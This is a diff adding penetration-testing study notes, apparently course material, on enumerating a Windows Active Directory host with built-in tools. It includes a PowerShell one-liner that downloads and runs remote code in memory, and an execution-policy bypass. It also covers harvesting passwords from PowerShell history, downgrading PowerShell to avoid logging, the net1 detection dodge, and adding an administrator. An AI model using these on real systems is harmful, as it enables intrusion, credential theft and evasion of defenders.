@@ -204,3 +204,131 @@ for this purpose tools like ActiveDirectory Powershell module, PowerView, Sharpv
 | set	| Displays a list of environment variables for the current session (ran from CMD-prompt)| 
 | echo %USERDOMAIN%	| Displays the domain name to which the host belongs (ran from CMD-prompt)| 
 | echo %logonserver%	| Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)| 
+
+| Cmd-Let | Description |
+| --- | --- |
+| Get-Module | Lists available modules loaded for use. |
+| Get-ExecutionPolicy -List | Will print the https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2 settings for each scope on a host. |
+| Set-ExecutionPolicy Bypass -Scope Process | This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
+| Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. |
+| Get-ChildItem Env: | ft Key,Value | Return environment values such as key paths, users, computer information, etc. |
+| powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" | This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |
+
+Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.
+
+```
+Get-host
+powershell.exe -version 2
+```
+### Check defenses
+firewall checks
+```
+netsh advfirewall show allprofiles
+```
+Windows Defender Check (from CMD.exe)
+```
+sc query windefend
+```
+```
+ Get-MpComputerStatus
+```
+check if anyone else is logged on the machine
+```
+qwinsta
+```
+### Network Information
+| Networking Commands | Description |
+| --- | --- |
+| arp -a | Lists all known hosts stored in the arp table. |
+| ipconfig /all | Prints out adapter settings for the host. We can figure out the network segment from here. |
+| route print | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
+| netsh advfirewall show state | Displays the status of the host's firewall. We can determine if it is active and filtering traffic. |
+
+### Windows Management Instrumentation (WMI)
+| Command | Description |
+| --- | --- |
+| wmic qfe get Caption,Description,HotFixID,InstalledOn | Prints the patch level and description of the Hotfixes applied |
+| wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List | Displays basic host information to include any attributes within the list |
+| wmic process list /format:list | A listing of all processes on host |
+| wmic ntdomain list /format:list | Displays information about the Domain and Domain Controllers |
+| wmic useraccount list /format:list | Displays information about all local accounts and any domain accounts that have logged into the device |
+| wmic group list /format:list | Information about all local groups |
+| wmic sysaccount list /format:list | Dumps information about any system accounts that are being used as service accounts. |
+https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4
+
+### Net commands
+| Command | Description |
+| --- | --- |
+| net accounts | Information about password requirements |
+| net accounts /domain | Password and lockout policy |
+| net group /domain | Information about domain groups |
+| net group "Domain Admins" /domain | List users with domain admin privileges |
+| net group "domain computers" /domain | List of PCs connected to the domain |
+| net group "Domain Controllers" /domain | List PC accounts of domains controllers |
+| net group <domain_group_name> /domain | User that belongs to the group |
+| net groups /domain | List of domain groups |
+| net localgroup | All available groups |
+| net localgroup administrators /domain | List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) |
+| net localgroup Administrators | Information about a group (admins) |
+| net localgroup administrators [username] /add | Add user to administrators |
+| net share | Check current shares |
+| net user <ACCOUNT_NAME> /domain | Get information about a user within the domain |
+| net user /domain | List all users of the domain |
+| net user %username% | Information about the current user |
+| net use x: \computer\share | Mount the share locally |
+| net view | Get a list of computers |
+| net view /all /domain[:domainname] | Shares on the domains |
+| net view \computer /ALL | List shares of a computer |
+| net view /domain | List of PCs of the domain |
+
+Net Commands Trick
+If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing net1 instead of net will execute the same functions without the potential trigger from the net string.
+
+### Dsquery
+Dsquery is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, dsquery will exist on any host with the Active Directory Domain Services Role installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at C:\Windows\System32\dsquery.dll.
+User search
+```
+dsquery user
+```
+Computer search
+```
+dsquery computer
+```
+We can use a dsquery wildcard search to view all objects in an OU, for example.
+```
+dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+```
+We can, of course, combine dsquery with LDAP search filters of our choosing. The below looks for users with the PASSWD_NOTREQD flag set in the userAccountControl attribute. - Users with specific attribute set
+```
+dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+```
+The below search filter looks for all Domain Controllers in the current domain, limiting to five results.
+```
+dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
+```
+### LDAP Filtering Explained
+You will notice in the queries above that we are using strings such as userAccountControl:1.2.840.113556.1.4.803:=8192. These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others. Let's break them down quickly:
+
+userAccountControl:1.2.840.113556.1.4.803: Specifies that we are looking at the User Account Control (UAC) attributes for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as Object Identifiers (OIDs).
+=8192 represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like password is not required or account is locked is set. These values can compound and make multiple different bit entries. Below is a quick list of potential values.
+![image](https://github.com/Kript0r3x/CPTS/assets/65650002/d0290e12-2cc4-4de0-8d50-e1ce773e386e)
+### OID match strings
+OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:
+
+1.2.840.113556.1.4.803
+When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.
+
+1.2.840.113556.1.4.804
+When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.
+
+1.2.840.113556.1.4.1941
+This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.
+
+### Logical Operators
+When building out search strings, we can utilize logical operators to combine values for the search. The operators & | and ! are used for this purpose. For example we can combine multiple search criteria with the & (and) operator like so:
+(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
+
+The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like (&(1) (2) (3)). The ! (not) and | (or) operators can work similarly. For example, our filter above can be modified as follows:
+(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
+
+This would search for any user object that does NOT have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.
